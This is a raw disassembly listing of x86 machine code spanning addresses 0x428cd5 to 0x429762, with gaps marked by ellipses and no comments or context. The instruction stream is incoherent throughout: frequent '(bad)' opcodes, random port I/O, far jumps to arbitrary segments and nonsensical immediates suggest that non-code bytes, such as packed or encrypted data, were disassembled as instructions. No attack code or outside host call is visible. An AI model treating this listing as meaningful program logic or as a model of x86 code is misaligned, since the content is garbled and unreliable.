  428cd5:	ror    BYTE PTR [eax-0x375498e8],0x35
  428cdc:	fist   DWORD PTR [ecx+0x2a0c401d]
  428ce2:	mov    dh,0xfe
  428ce4:	fcmovne st,st(5)
  428ce6:	jnp    0x428d4a
  428ce8:	and    eax,DWORD PTR [edi+0x7daaf2c9]
  428cee:	cmp    al,0x6c
  428cf0:	gs jle 0x428cf1
  428cf3:	fistp  QWORD PTR [edi]
  428cf5:	outs   dx,DWORD PTR ds:[esi]
  428cf6:	loop   0x428c7b
  428cf8:	imul   ecx,DWORD PTR [ecx],0xa6043ccd
  428cfe:	xor    DWORD PTR [ebp-0x7f],edx
  428d01:	inc    ebp
  428d02:	push   ebp
  428d03:	jge    0x428d0c
  428d05:	ins    DWORD PTR es:[edi],dx
  428d06:	jmp    0xa311:0xe22a8f19
  428d0d:	mov    ds:0xd6ec,al
	...
  428d72:	add    BYTE PTR [eax],al
  428d74:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0x3894
  428d82:	idiv   BYTE PTR [ebx+0x58]
  428d85:	mov    ah,0x1
  428d87:	add    BYTE PTR [ecx+eax*1],al
  428d8a:	add    BYTE PTR [eax],al
  428d8c:	or     BYTE PTR [ebx+0x7b],0xc
  428d90:	xlat   BYTE PTR ds:[ebx]
  428d91:	mov    ds:0x5fa4f77a,eax
  428d96:	call   0xe5f26f71
  428d9b:	jge    0x428dcd
  428d9d:	adc    eax,0xcb39b77a
  428da2:	fistp  DWORD PTR ds:0x6319df85
  428da8:	xlat   BYTE PTR ds:[ebx]
  428da9:	mov    ecx,?
  428dab:	fwait
  428dac:	sub    esi,ebp
  428dae:	sbb    DWORD PTR [edx],ecx
  428db0:	js     0x428e21
  428db2:	not    BYTE PTR [esi-0x57c878fc]
  428db8:	cmp    eax,0xb11bf751
  428dbd:	out    0xa3,al
  428dbf:	(bad)  
  428dc0:	loope  0x428da4
  428dc2:	inc    esp
  428dc3:	dec    esp
  428dc4:	mov    al,ds:0xd18a5627
  428dc9:	fsubp  st(0),st
  428dcb:	add    ebp,DWORD PTR [esi+0x77e13104]
  428dd1:	lods   eax,DWORD PTR ds:[esi]
  428dd2:	xchg   ecx,edi
  428dd4:	jbe    0x428de8
  428dd6:	iret   
  428dd7:	test   ch,dl
  428dd9:	in     eax,0x74
  428ddb:	std    
  428ddc:	out    0x95,eax
  428dde:	(bad)  
  428ddf:	nop
  428de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428de1:	add    al,0x3d
  428de3:	adc    dl,ch
  428de5:	in     al,0x64
  428de7:	cmc    
  428de8:	dec    eax
  428de9:	ds pop ds
  428deb:	in     al,0xcb
  428ded:	lock or ch,BYTE PTR [eax]
  428df0:	rcl    BYTE PTR [ecx-0xfc33919],0x2f
  428df7:	sahf   
  428df8:	jge    0x428ddd
  428dfa:	adc    BYTE PTR [ecx],al
  428dfc:	pushf  
  428dfd:	fcomp  st(0)
  428dff:	call   0xf859bad0
  428e04:	mov    bl,BYTE PTR [edi+0x79761373]
  428e0a:	inc    ebx
  428e0b:	add    eax,0xd5e31b0
  428e10:	xor    eax,0x67498db2
  428e15:	push   edi
  428e16:	mov    ch,0x83
  428e18:	sti    
  428e19:	aad    0x96
  428e1b:	sub    al,0xc4
  428e1d:	xchg   ebp,eax
  428e1e:	or     al,0x90
  428e20:	mov    bh,0x13
  428e22:	stos   DWORD PTR es:[edi],eax
  428e23:	scas   al,BYTE PTR es:[edi]
  428e24:	dec    ebp
  428e25:	jmp    0x331d3af3
  428e2a:	je     0x428dca
  428e2c:	or     al,0x9
  428e2e:	xchg   edi,eax
  428e2f:	call   0x856e93e7
  428e34:	sub    al,ch
  428e36:	jmp    0xe75f:0xbf659f1c
  428e3d:	ret    0x6201
  428e40:	jmp    DWORD PTR [edx]
  428e42:	xor    edi,eax
  428e44:	adc    al,BYTE PTR [ecx+0x5f]
  428e47:	xchg   BYTE PTR [ecx+ecx*8-0x13baf728],dl
  428e4e:	mov    BYTE PTR [ebp+0x77],cl
  428e51:	mov    ah,0x8d
  428e53:	(bad)  
  428e54:	mov    edx,0x4a51ac2e
  428e59:	jo     0x428e77
  428e5b:	shl    BYTE PTR [ecx+edi*2],cl
  428e5e:	xchg   ebp,eax
  428e5f:	out    0xc8,al
  428e61:	add    DWORD PTR [esi],ebx
  428e63:	inc    esi
  428e64:	outs   dx,DWORD PTR ds:[esi]
  428e65:	mov    ebx,0xf46f16dd
  428e6a:	inc    ebx
  428e6b:	inc    ebx
  428e6c:	div    DWORD PTR [ebp+0x13]
  428e6f:	nop
  428e70:	mov    eax,ds:0x7f29d55f
  428e75:	dec    eax
  428e76:	pop    eax
  428e77:	into   
  428e78:	sub    al,0x4b
  428e7a:	(bad)  
  428e7b:	imul   esi,DWORD PTR [ebp+0x7bb06610],0x5f
  428e82:	jl     0x428e8f
  428e84:	js     0x428e39
  428e86:	or     al,0xdf
  428e88:	data16 jne 0x428f08
  428e8b:	jne    0x428e36
  428e8d:	cwde   
  428e8e:	pop    edx
  428e8f:	sub    eax,DWORD PTR [eax]
	...
  428ef1:	add    BYTE PTR [eax],al
  428ef3:	add    BYTE PTR [edi+0x5d],cl
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0xf4
  428f01:	jmp    0x1:0xb55c8df5
  428f08:	add    al,0x1
  428f0a:	add    BYTE PTR [eax],al
  428f0c:	packuswb mm4,QWORD PTR [edx]
  428f0f:	pop    ebp
  428f10:	loopne 0x428f6b
  428f12:	lods   al,BYTE PTR ds:[esi]
  428f13:	adc    DWORD PTR [edi-0x75954b29],ebx
  428f19:	ror    DWORD PTR [eax-0x6c01ae74],1
  428f1f:	sub    eax,0x4096186e
  428f24:	addr16 sub ebx,ebp
  428f27:	cld    
  428f28:	pop    ecx
  428f29:	pop    ebx
  428f2a:	je     0x428f8d
  428f2c:	pop    ss
  428f2d:	pop    ebp
  428f2e:	imul   esp,ebx,0x819d99f5
  428f34:	lock xchg ebx,eax
  428f36:	in     eax,dx
  428f37:	dec    eax
  428f38:	sub    al,0xad
  428f3a:	adc    BYTE PTR ds:0x6a0ff512,dh
  428f40:	push   eax
  428f41:	pop    edi
  428f42:	cld    
  428f43:	mov    dl,0x8b
  428f45:	cmp    DWORD PTR [ebx],ebp
  428f47:	sub    eax,0x466b2ac4
  428f4c:	leave  
  428f4d:	stos   DWORD PTR es:[edi],eax
  428f4e:	push   ecx
  428f4f:	sub    DWORD PTR [eax+edx*4+0x4b9b8d54],ebx
  428f56:	dec    edi
  428f57:	inc    edi
  428f58:	int3   
  428f59:	add    dl,al
  428f5b:	int    0x21
  428f5d:	cld    
  428f5e:	cmp    edx,edi
  428f60:	inc    ebx
  428f61:	ja     0x428fc4
  428f63:	data16 mov al,ds:0x1976e5ef
  428f69:	push   0x20
  428f6b:	repz cdq 
  428f6d:	sub    dh,BYTE PTR [edi]
  428f6f:	or     al,0xd6
  428f71:	nop
  428f72:	lahf   
  428f73:	sbb    dl,BYTE PTR [edi+0x6a90c838]
  428f79:	call   0xea71:0xf1f01b4a
  428f80:	jmp    0x428f11
  428f82:	sar    DWORD PTR [ebx-0x1],1
  428f85:	in     al,0xe2
  428f87:	mov    bl,0xc6
  428f89:	aad    0xc7
  428f8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f8c:	cdq    
  428f8d:	add    esp,edi
  428f8f:	(bad)  
  428f90:	je     0x428f35
  428f92:	es add eax,0x9e484cfc
  428f98:	or     BYTE PTR [edx],0x91
  428f9b:	cld    
  428f9c:	arpl   WORD PTR [ebp+0x44],ax
  428f9f:	sbb    ebx,esp
  428fa1:	(bad)  
  428fa2:	(bad)  
  428fa3:	dec    esi
  428fa4:	xor    ebx,edi
  428fa6:	push   eax
  428fa7:	fst    QWORD PTR [esi]
  428fa9:	cdq    
  428faa:	adc    dl,BYTE PTR [ecx+0x7a]
  428fad:	cmp    al,0xcf
  428faf:	repz cmp DWORD PTR [ecx+0x41],esp
  428fb3:	into   
  428fb4:	mov    bl,0x5b
  428fb6:	add    BYTE PTR [ecx+0x63],ah
  428fb9:	enter  0x4206,0xc
  428fbd:	mov    esi,0xad1feeb9
  428fc2:	bound  edi,QWORD PTR [ecx+0x8]
  428fc5:	lods   al,BYTE PTR ds:[esi]
  428fc6:	mov    ebx,0xbdb2472e
  428fcb:	jmp    0x3868:0x82283e5e
  428fd2:	push   edx
  428fd3:	sti    
  428fd4:	add    eax,0xfae28d22
  428fd9:	cli    
  428fda:	dec    edx
  428fdb:	dec    edx
  428fdc:	pop    edi
  428fdd:	scas   eax,DWORD PTR es:[edi]
  428fde:	pushf  
  428fdf:	and    eax,0x181ab7d5
  428fe4:	xor    esp,DWORD PTR [ebx+0x12f9b421]
  428fea:	jmp    0xa373:0x678b8aaa
  428ff1:	jns    0x428ffc
  428ff3:	dec    edi
  428ff4:	es ror esp,cl
  428ff7:	pop    edx
  428ff8:	cmp    eax,0x8bec1ed2
  428ffd:	ins    BYTE PTR es:[edi],dx
  428ffe:	push   es
  428fff:	mov    ecx,0xc593df74
  429004:	ins    BYTE PTR es:[edi],dx
  429005:	add    DWORD PTR [edi],0xffffff96
  429008:	(bad)  
  429009:	call   0x2584ade4
  42900e:	dec    edx
  42900f:	push   ds
	...
  429074:	loope  0x429062
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0xd2fc7b77
  429081:	fyl2xp1 
  429083:	mov    ds:0x1b660,al
  429088:	add    al,0x1
  42908a:	add    BYTE PTR [eax],al
  42908c:	add    ch,BYTE PTR ds:0xb89ceca9
  429092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429093:	loop   0x4290c3
  429095:	sbb    eax,0xffb761a6
  42909a:	and    edx,DWORD PTR [ebx]
  42909c:	pushf  
  42909d:	retf   
  42909e:	xchg   ecx,eax
  42909f:	sbb    BYTE PTR [edx],0x7
  4290a2:	fstp   DWORD PTR [esi+0x7f]
  4290a5:	push   esi
  4290a6:	lods   al,BYTE PTR ds:[esi]
  4290a7:	push   eax
  4290a8:	test   BYTE PTR [edx-0x43],al
  4290ab:	fldcw  WORD PTR [eax*4-0x385a9731]
  4290b2:	aad    0xdd
  4290b4:	in     al,0x57
  4290b6:	lock adc ah,ah
  4290b9:	mov    eax,0x92f31cd0
  4290be:	aam    0x82
  4290c0:	out    dx,eax
  4290c1:	int    0x91
  4290c3:	push   ebx
  4290c4:	add    eax,0x3051baf2
  4290c9:	jl     0x4290f6
  4290cb:	js     0x429064
  4290cd:	xchg   ch,ah
  4290cf:	nop
  4290d0:	in     eax,dx
  4290d1:	sbb    ah,bh
  4290d3:	push   ss
  4290d4:	fs mov bl,0xa9
  4290d7:	xchg   ebp,eax
  4290d8:	aaa    
  4290d9:	jae    0x4290bf
  4290db:	mov    bl,0xe7
  4290dd:	out    0xf8,eax
  4290df:	frstor [ecx+0x22]
  4290e2:	(bad)  
  4290e3:	mov    ds:0x257549d1,eax
  4290e8:	sub    ecx,DWORD PTR [eax+0x2f511179]
  4290ee:	sub    BYTE PTR [ecx-0x3fa8bebf],cl
  4290f4:	mov    ebx,0x1b2eacd7
  4290f9:	sbb    DWORD PTR [edi-0x18],eax
  4290fc:	int    0xd3
  4290fe:	push   esp
  4290ff:	hlt    
  429100:	jns    0x429147
  429102:	adc    ebx,ebp
  429104:	(bad)  
  429105:	call   0x512f56a5
  42910a:	rcr    BYTE PTR [esi-0x520d1879],0x30
  429111:	cmp    al,0x1b
  429113:	jne    0x42913b
  429115:	ss or  eax,0x3b8419e0
  42911b:	(bad)  
  42911c:	(bad)
  429121:	xchg   ebp,eax
  429122:	inc    eax
  429123:	cmp    DWORD PTR [ebx],edi
  429125:	iret   
  429126:	leave  
  429127:	ins    DWORD PTR es:[edi],dx
  429128:	adc    bh,BYTE PTR [edx]
  42912a:	stc    
  42912b:	js     0x42910f
  42912d:	jmp    DWORD PTR [esi-0x49]
  429130:	out    0xdf,eax
  429132:	in     eax,0x2b
  429134:	imul   eax,DWORD PTR [edi],0x4a3a9b56
  42913a:	out    0xf9,al
  42913c:	push   ecx
  42913d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42913e:	pop    esi
  42913f:	adc    eax,0xdacac8a6
  429144:	cdq    
  429145:	jbe    0x42917e
  429147:	repz xor BYTE PTR [eax],ch
  42914a:	sbb    ecx,ebx
  42914c:	pop    eax
  42914d:	js     0x429184
  42914f:	or     DWORD PTR [ebp-0x5dc2870f],edi
  429155:	lock inc esi
  429157:	or     DWORD PTR [eax+0x662dd99d],0xb93d810d
  429161:	jmp    0xfd8d9c67
  429166:	push   edi
  429167:	or     dh,ch
  429169:	sbb    al,bh
  42916b:	xchg   esi,eax
  42916c:	leave  
  42916d:	sbb    BYTE PTR [ebx+ecx*4+0x16b9fae0],bl
  429174:	pop    edi
  429175:	jp     0x4291a6
  429177:	sbb    cl,al
  429179:	mov    ebp,DWORD PTR [ebp-0xcc496d8]
  42917f:	lahf   
  429180:	or     BYTE PTR [edx],al
  429182:	push   edx
  429183:	sti    
  429184:	div    ebx
  429186:	retf   
  429187:	and    eax,0xf6f519e9
  42918c:	push   ecx
  42918d:	stos   DWORD PTR es:[edi],eax
  42918e:	dec    edx
  42918f:	imul   eax,DWORD PTR [eax],0x0
	...
  4291f2:	add    BYTE PTR [eax],al
  4291f4:	push   esi
  4291f5:	xchg   ebp,edi
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [edi+eiz*2+0x641b7d3f],0x40001b7
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [edi-0x79],bh
  42920e:	or     al,0x69
  429210:	sbb    al,0x45
  429212:	icebp  
  429213:	sbb    dl,BYTE PTR [ecx]
  429215:	rol    BYTE PTR [esi-0x5041fba9],1
  42921b:	int    0x73
  42921d:	or     DWORD PTR [eax-0x6e],0xffffffda
  429221:	test   BYTE PTR [eax-0x70aa161f],0xfb
  429228:	add    ch,BYTE PTR ds:0x4cb78bc9
  42922e:	shl    DWORD PTR [eax+0x46ec00ac],cl
  429234:	jb     0x429222
  429236:	jns    0x4291f9
  429238:	das    
  429239:	js     0x429200
  42923b:	sub    al,ch
  42923d:	mov    DWORD PTR [edi-0x3e],ecx
  429240:	sub    ebp,DWORD PTR [edx+eax*1-0x225d5ee]
  429247:	dec    ebp
  429248:	out    dx,eax
  429249:	popf   
  42924a:	nop    ebp
  42924d:	lea    ecx,[ecx]
  42924f:	lock clc 
  429251:	adc    al,0xe4
  429253:	mov    al,0xb7
  429255:	sbb    eax,DWORD PTR ds:0x960b045f
  42925b:	rcr    BYTE PTR [ebp-0x1e4e3dbe],cl
  429261:	aaa    
  429262:	pop    edi
  429263:	lds    edi,FWORD PTR [edx]
  429265:	outs   dx,DWORD PTR ds:[esi]
  429266:	fcom   st(5)
  429268:	or     BYTE PTR [ecx],0x7c
  42926b:	sbb    DWORD PTR ds:0x9b7bbea3,0x2a
  429272:	int    0xda
  429274:	(bad)  
  429275:	int    0xec
  429277:	or     ah,BYTE PTR [esi-0x8]
  42927a:	inc    ebx
  42927b:	pop    ds
  42927c:	mov    ds:0xbd987487,eax
  429281:	dec    ecx
  429282:	scas   eax,DWORD PTR es:[edi]
  429283:	fimul  WORD PTR [eax-0x4e]
  429286:	in     al,0xd8
  429288:	sahf   
  429289:	pop    es
  42928a:	les    eax,FWORD PTR [edx]
  42928c:	retf   0x65f9
  42928f:	mov    ch,0xd7
  429291:	stc    
  429292:	xor    edx,ebx
  429294:	test   BYTE PTR [ecx+0x1d],dl
  429297:	jmp    0xc669125b
  42929c:	std    
  42929d:	imul   edi,DWORD PTR ds:0xb3f68817,0x997a5926
  4292a7:	gs push eax
  4292a9:	les    esp,FWORD PTR [edi]
  4292ab:	pop    ebx
  4292ac:	or     BYTE PTR [edi],dl
  4292ae:	push   ebp
  4292af:	xor    ch,BYTE PTR ds:0xc9479ac2
  4292b5:	ins    BYTE PTR es:[edi],dx
  4292b6:	xor    DWORD PTR cs:[edx-0x1f],0xfa6fb21b
  4292be:	fidivr DWORD PTR [ecx-0x60]
  4292c1:	imul   edi,DWORD PTR [ebp+0x76f6bd],0xffffffd4
  4292c8:	sbb    BYTE PTR [ecx-0x3a58fa20],0xc7
  4292cf:	out    dx,eax
  4292d0:	push   ss
  4292d1:	push   ds
  4292d2:	retf   0x572e
  4292d5:	cmp    eax,0xe2006b34
  4292da:	repz ror BYTE PTR [esi-0x4165675b],0xcc
  4292e2:	jae    0x4292be
  4292e4:	ret    0x4324
  4292e7:	sbb    bl,BYTE PTR [ebp-0x11fc2778]
  4292ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4292ee:	jno    0x429303
  4292f0:	push   edi
  4292f1:	mov    eax,0x471cd816
  4292f6:	sbb    eax,0x4bdc14f0
  4292fb:	scas   al,BYTE PTR es:[edi]
  4292fc:	sbb    esp,DWORD PTR [eax+ecx*2]
  4292ff:	dec    ebx
  429300:	repnz xor BYTE PTR [ebx+0x6],cl
  429304:	xlat   BYTE PTR ds:[ebx]
  429305:	push   ebp
  429306:	ret    0x73bb
  429309:	jno    0x4292da
  42930b:	in     al,0xc0
  42930d:	call   0x0:0x40a7
	...
  429374:	lock adc al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0x73
  429381:	cmp    BYTE PTR [ecx+0x1b86807],dh
  429387:	add    BYTE PTR [ecx+eax*1],al
  42938a:	add    BYTE PTR [eax],al
  42938c:	mov    al,BYTE PTR [ebx-0x8a617e5]
  429392:	pop    edx
  429393:	jle    0x429359
  429395:	mov    ch,0xc4
  429397:	std    
  429398:	sbb    cl,BYTE PTR [eax]
  42939a:	fidiv  DWORD PTR [esi-0x75]
  42939d:	jne    0x4293ee
  42939f:	(bad)  
  4293a0:	sub    al,0x90
  4293a2:	push   ss
  4293a3:	jo     0x429346
  4293a5:	xchg   ecx,ebx
  4293a7:	ds push esp
  4293a9:	je     0x4293e2
  4293ab:	xor    BYTE PTR [ebp+0x37324316],bh
  4293b1:	out    dx,al
  4293b2:	push   edi
  4293b3:	loopne 0x429364
  4293b5:	call   DWORD PTR [eax]
  4293b7:	arpl   sp,si
  4293b9:	retf   0xd9f3
  4293bc:	push   dx
  4293be:	jg     0x42938f
  4293c0:	sbb    DWORD PTR [eax-0x79d2a088],ebp
  4293c6:	mov    WORD PTR [ecx+0x688a034d],es
  4293cc:	cmp    BYTE PTR [ebx],ah
  4293ce:	mov    esi,DWORD PTR [eax+0x27]
  4293d1:	add    al,0x35
  4293d3:	imul   ebp,DWORD PTR [edi+0x4e],0x1ed41d06
  4293da:	ins    BYTE PTR es:[edi],dx
  4293db:	ds stos DWORD PTR es:[edi],eax
  4293dd:	mov    ch,0x88
  4293df:	pop    esi
  4293e0:	xchg   ebp,eax
  4293e1:	iret   
  4293e2:	or     al,BYTE PTR [ebx]
  4293e4:	sub    ecx,edi
  4293e6:	xor    BYTE PTR [ebp+0x48eae91b],0x47
  4293ed:	fidiv  DWORD PTR [ecx]
  4293ef:	test   DWORD PTR [esp+edx*4],esp
  4293f2:	loopne 0x42944b
  4293f4:	inc    DWORD PTR [edi+0x6c0d5922]
  4293fa:	sbb    eax,0x327d1e5
  4293ff:	pop    esi
  429400:	mov    DWORD PTR [esp+edi*8],ebx
  429403:	mov    ss,eax
  429405:	mov    ?,WORD PTR [edx+0x72bc4cc7]
  42940b:	mov    edi,0xf71a981
  429410:	or     DWORD PTR ds:0xe79525b3,ebx
  429416:	xor    al,0xf7
  429418:	mov    edx,0x51b5513f
  42941d:	das    
  42941e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42941f:	sub    BYTE PTR [ebx],bh
  429421:	inc    edx
  429422:	sbb    eax,0xff8e5bda
  429427:	cmp    ah,BYTE PTR [ecx+0x2d]
  42942a:	sub    DWORD PTR [eax+0x32],eax
  42942d:	les    ebx,FWORD PTR [ebx]
  42942f:	and    DWORD PTR [edi+edx*2+0x64580309],eax
  429436:	stos   DWORD PTR es:[edi],eax
  429437:	arpl   di,bx
  429439:	imul   edi,DWORD PTR [ebx-0x533029c0],0xffffffbe
  429440:	je     0x4293c2
  429442:	outs   dx,DWORD PTR ds:[esi]
  429443:	pop    ds
  429444:	pop    edx
  429445:	add    eax,0xbddff728
  42944a:	xchg   DWORD PTR [edx+0x3c],esi
  42944d:	(bad)  [edx-0x43]
  429450:	dec    ebp
  429451:	jle    0x42945e
  429453:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429454:	xor    dl,BYTE PTR [eax-0x6eb8f437]
  42945a:	mov    al,ds:0xa22568af
  42945f:	sub    DWORD PTR [ebx*4+0x63d60414],0xffffffe2
  429467:	cwde   
  429468:	pop    ebx
  429469:	std    
  42946a:	cmp    DWORD PTR [eax],esi
  42946c:	lods   eax,DWORD PTR ds:[esi]
  42946d:	mov    al,bl
  42946f:	mov    eax,0x45e8941a
  429474:	(bad)  
  429475:	push   eax
  429476:	lods   al,BYTE PTR ds:[esi]
  429477:	data16 (bad) 
  429479:	stc    
  42947a:	gs cwde 
  42947c:	outs   dx,BYTE PTR ds:[esi]
  42947d:	icebp  
  42947e:	in     al,dx
  42947f:	nop
  429480:	inc    edx
  429481:	push   ebp
  429482:	enter  0x3f86,0xb8
  429486:	jge    0x4294bd
  429488:	ffreep st(3)
  42948a:	jmp    0xc2:0x9e5b1a1a
	...
  4294f1:	add    BYTE PTR [eax],al
  4294f3:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  4294f7:	sub    al,0x53
  4294f9:	ds jg  0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp-0x72c19c16],dx
  429503:	(bad)  
  429504:	ins    BYTE PTR es:[edi],dx
  429505:	mov    ecx,0x1040001
  42950a:	add    BYTE PTR [eax],al
  42950c:	hlt    
  42950d:	es xor eax,0x84575c4b
  429513:	out    dx,eax
  429514:	inc    esp
  429515:	jl     0x42957f
  429517:	loopne 0x4294ba
  429519:	mov    dl,0xc3
  42951b:	push   es
  42951c:	xor    BYTE PTR [eax-0x2c],ch
  42951f:	loopne 0x4294ef
  429521:	outs   dx,DWORD PTR ds:[esi]
  429522:	scas   eax,DWORD PTR es:[edi]
  429523:	xor    BYTE PTR [esi],bh
  429525:	hlt    
  429526:	(bad)  
  429527:	ds sub ah,dh
  42952a:	adc    dl,BYTE PTR [edi+0x69]
  42952d:	sub    BYTE PTR [ecx+0x20d0d2fc],dh
  429533:	xchg   edx,eax
  429534:	push   ecx
  429535:	jle    0x42959e
  429537:	cmp    DWORD PTR [eax-0x16],ebx
  42953a:	pop    di
  42953c:	shl    BYTE PTR [eax-0x68d2f574],0xe7
  429543:	xlat   BYTE PTR ds:[ebx]
  429544:	and    ah,ah
  429546:	sub    BYTE PTR [edi+0x12e4d6a4],bh
  42954c:	or     al,0x4f
  42954e:	stos   BYTE PTR es:[edi],al
  42954f:	cwde   
  429550:	je     0x4295c9
  429552:	push   es
  429553:	loopne 0x429588
  429555:	hlt    
  429556:	jno    0x4295cf
  429558:	in     eax,dx
  429559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42955a:	fwait
  42955b:	pusha  
  42955c:	aam    0xcd
  42955e:	lock jl 0x42957f
  429561:	in     eax,dx
  429562:	jmp    0xba5ff40f
  429567:	mov    eax,DWORD PTR [esi-0x74]
  42956a:	push   ebp
  42956b:	das    
  42956c:	inc    edi
  42956d:	mov    esi,0x4a434a2a
  429572:	hlt    
  429573:	sbb    DWORD PTR ds:0x14984491,esi
  429579:	xchg   si,ax
  42957b:	jnp    0x429522
  42957d:	sbb    al,0x49
  42957f:	pop    ecx
  429580:	inc    eax
  429581:	pop    eax
  429582:	lea    eax,[ebx]
  429584:	adc    DWORD PTR es:[edi-0x3d],esp
  429588:	nop
  429589:	and    eax,0x5fdeda50
  42958e:	arpl   WORD PTR [eax+0x437885a6],bx
  429594:	ins    DWORD PTR es:[edi],dx
  429595:	out    0x95,eax
  429597:	dec    ebp
  429598:	or     edi,edx
  42959a:	loope  0x429615
  42959c:	out    dx,al
  42959d:	mov    edi,0x7f89020
  4295a2:	retf   
  4295a3:	icebp  
  4295a4:	in     al,0x20
  4295a6:	push   ds
  4295a7:	mov    bl,0x97
  4295a9:	or     ch,cl
  4295ab:	sbb    edx,DWORD PTR [eax-0x61]
  4295ae:	cld    
  4295af:	nop
  4295b0:	pop    ebp
  4295b1:	ficomp WORD PTR [ebx]
  4295b3:	mov    edx,0x27fe4a05
  4295b8:	sbb    bh,BYTE PTR [ecx+edx*8-0x75]
  4295bc:	popf   
  4295bd:	sbb    al,0x52
  4295bf:	ret    0x79bc
  4295c2:	in     eax,dx
  4295c3:	sub    DWORD PTR [ebp+0xc891c9b],ebp
  4295c9:	fild   QWORD PTR [edx]
  4295cb:	sbb    cl,al
  4295cd:	out    0x46,eax
  4295cf:	push   ss
  4295d0:	jne    0x429561
  4295d2:	push   eax
  4295d3:	cmp    edx,DWORD PTR [ebp+0xf27bd4c]
  4295d9:	sbb    al,0xc6
  4295db:	sub    eax,0x157e823c
  4295e0:	pop    eax
  4295e1:	lahf   
  4295e2:	shr    DWORD PTR [esi+eiz*2],1
  4295e5:	and    ebp,ecx
  4295e7:	xchg   al,al
  4295e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295ea:	clc    
  4295eb:	mov    esp,0x59c4d558
  4295f0:	sbb    DWORD PTR [esi+0x12],eax
  4295f3:	mov    eax,ds:0x566cf9e2
  4295f8:	pop    ds
  4295f9:	ret    0x495
  4295fc:	xor    BYTE PTR [esi-0x6ecb26e5],ch
  429602:	push   0xffffffa8
  429604:	idiv   edi
  429606:	stc    
  429607:	aaa    
  429608:	add    BYTE PTR [ebp-0x17],al
  42960b:	sub    BYTE PTR [esi+0x50],dl
  42960e:	jmp    0x4296bb
	...
  429673:	add    BYTE PTR [ebp+0x1d],ch
  429676:	out    0xc0,al
  429678:	idiv   bl
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	clc    
  429681:	mov    WORD PTR [edx+0x1ba7038],cs
  429687:	add    BYTE PTR [ecx+eax*1],al
  42968a:	add    BYTE PTR [eax],al
  42968c:	inc    esp
  42968d:	fist   WORD PTR [esi-0x43f20270]
  429693:	inc    edx
  429694:	lods   al,BYTE PTR ds:[esi]
  429695:	push   ebx
  429696:	int    0x3c
  429698:	(bad)  
  429699:	icebp  
  42969a:	pop    ss
  42969b:	mov    esp,0x3b9c99b2
  4296a0:	icebp  
  4296a1:	test   eax,0x57985fc4
  4296a6:	xchg   edx,eax
  4296a7:	pusha  
  4296a8:	xrelease mov DWORD PTR [bp+si-0x43],ecx
  4296ad:	out    dx,eax
  4296ae:	retf   
  4296af:	mov    edi,0xb470172
  4296b4:	mov    ah,0xeb
  4296b6:	pop    eax
  4296b7:	rcl    DWORD PTR [ebp+eax*1+0x7f],1
  4296bb:	js     0x429718
  4296bd:	mov    ebp,0x59bf40d2
  4296c2:	pop    ds
  4296c3:	outs   dx,DWORD PTR ds:[esi]
  4296c4:	adc    ebp,DWORD PTR [edi-0x136af710]
  4296ca:	lea    esp,[ecx-0x687f99a0]
  4296d0:	cmp    al,0x5f
  4296d2:	lods   eax,DWORD PTR ds:[esi]
  4296d3:	scas   eax,DWORD PTR es:[edi]
  4296d4:	out    0xb9,eax
  4296d6:	mov    al,ds:0x56c4da54
  4296db:	add    eax,0x45a67024
  4296e0:	fiadd  DWORD PTR [ecx]
  4296e2:	mov    edx,0x9802fa09
  4296e7:	or     eax,0xc0517907
  4296ec:	aas    
  4296ed:	test   al,cl
  4296ef:	pop    edi
  4296f0:	jle    0x429744
  4296f2:	add    DWORD PTR [edi],0x72da6bcc
  4296f8:	push   esi
  4296f9:	ret    0x29fb
  4296fc:	imul   ebx,DWORD PTR [eax-0x76],0xffffffa4
  429700:	inc    ebp
  429701:	xor    eax,0xedc66fa1
  429706:	and    DWORD PTR [esi+0x3a],edx
  429709:	rol    edx,1
  42970b:	int    0x35
  42970d:	jno    0x429786
  42970f:	or     al,0x46
  429711:	imul   ebp,DWORD PTR [esi+0x52858e05],0x9680dc5f
  42971b:	scas   eax,DWORD PTR es:[edi]
  42971c:	jmp    0x136aff7
  429721:	call   DWORD PTR [ebx+0x1c]
  429724:	pop    esi
  429725:	lods   al,BYTE PTR ds:[esi]
  429726:	xchg   esi,eax
  429727:	mov    bl,0x75
  429729:	pushf  
  42972a:	(bad)  
  42972b:	(bad)  
  42972c:	sub    al,0xb1
  42972e:	pop    ecx
  42972f:	shl    DWORD PTR [esi-0x4783722b],cl
  429735:	fcmovnu st,st(3)
  429737:	ror    al,0x7b
  42973a:	or     DWORD PTR [eax+eiz*1],ebx
  42973d:	mov    dl,0x86
  42973f:	je     0x429763
  429741:	dec    eax
  429742:	ja     0x4297b6
  429744:	cwde   
  429745:	add    BYTE PTR [ecx+ecx*4],ah
  429748:	ret    0x3bdc
  42974b:	pop    es
  42974c:	add    BYTE PTR [ecx-0x4e],0x8d
  429750:	mov    eax,ds:0xdc08a43c
  429755:	or     edx,DWORD PTR [ecx+0x515387ce]
  42975b:	movaps XMMWORD PTR [ebp-0x4ccc5a53],xmm7
  429762:	sbb    edi,DWORD PTR [esi+0x43]
